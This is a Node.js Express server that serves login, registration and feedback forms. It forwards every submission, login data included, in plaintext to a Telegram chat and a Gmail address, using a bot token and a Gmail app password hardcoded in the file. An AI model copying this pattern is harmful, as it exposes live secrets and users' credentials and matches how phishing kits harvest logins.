import express from 'express'
import path from 'path'
import axios from 'axios'
import nodemailer from 'nodemailer'

const __dirname = path.resolve();
const PORT = process.env.PORT ?? 3000;
const app = express();
const jsonParser = express.json();
//telegram
const BOT_TOKEN = '6733180388:AAGAh2tNJkhg6hbgBXN_MzIBgNrrfl4iHlE';
const CHAT_ID = '-1001850641600';

app.use(express.static(path.resolve(__dirname, 'client')));

app.get('/', (req, res) => {
     res.sendFile(path.resolve(__dirname, 'client', 'index.html'));
})

app.get('/feedback', (req, res) => {
     res.sendFile(path.resolve(__dirname, 'client', 'feedbackform.html'));
})

app.get('/login', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'client', 'loginform.html'));
})

app.get('/registration', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'client', 'registrationform.html'));
})

app.listen(PORT, () => {
    console.log(`Server has been started on port ${PORT}...`);
}) 

app.post("/feedbackdata", jsonParser, async (req, res) => {
    const responseText = req.body;

    if (!responseText) {
      return res.sendStatus(400);
    }
    res.send(responseText);

    //telegram
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${JSON.stringify(responseText)}`;
    try {
      const response = await axios.get(TELEGRAM_API_URL);
      console.log('Message successfully sent:', response);
    } catch (error) {
      console.error('Error sending message to Telegram:', error.message);
    }

    //email
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 't9380522@gmail.com',
            pass: 'gdlo ztxn jole dpnd'
        }
    });

    const mailOptions = {
        from: 't9380522@gmail.com',
        to: 'trembach.ann@gmail.com',
        subject: 'Feedback data',
        text: JSON.stringify(responseText)
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error.message);
        } else {
            console.log('Email sent:', info.response);
        }
    });
});

app.post("/registrationdata", jsonParser, async (req, res) => {
    const responseText = req.body;
    
    if (!responseText) {
      return res.sendStatus(400);
    }
  
    res.send(responseText);
    //telegram
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${JSON.stringify(responseText)}`;
    try {
      const response = await axios.get(TELEGRAM_API_URL);
      console.log('Message successfully sent:', response);
    } catch (error) {
      console.error('Error sending message to Telegram:', error.message);
    }

    //email
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 't9380522@gmail.com',
            pass: 'gdlo ztxn jole dpnd'
        }
    });

    const mailOptions = {
        from: 't9380522@gmail.com',
        to: 'trembach.ann@gmail.com',
        subject: 'Registration data',
        text: JSON.stringify(responseText)
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error.message);
        } else {
            console.log('Email sent:', info.response);
        }
    });
});

app.post('/logindata', jsonParser, async (req, res) => {
    const responseText = req.body;
  
    if (!responseText) {
      return res.sendStatus(400);
    }
    res.send(responseText);

    //telegram
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${JSON.stringify(responseText)}`;
    try {
      const response = await axios.get(TELEGRAM_API_URL);
      console.log('Message successfully sent:', response);
    } catch (error) {
      console.error('Error sending message to Telegram:', error.message);
    }

    //email
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 't9380522@gmail.com',
            pass: 'gdlo ztxn jole dpnd'
        }
    });

    const mailOptions = {
        from: 't9380522@gmail.com',
        to: 'trembach.ann@gmail.com',
        subject: 'Login data',
        text: JSON.stringify(responseText)
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error.message);
        } else {
            console.log('Email sent:', info.response);
        }
    });
});

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
}); 
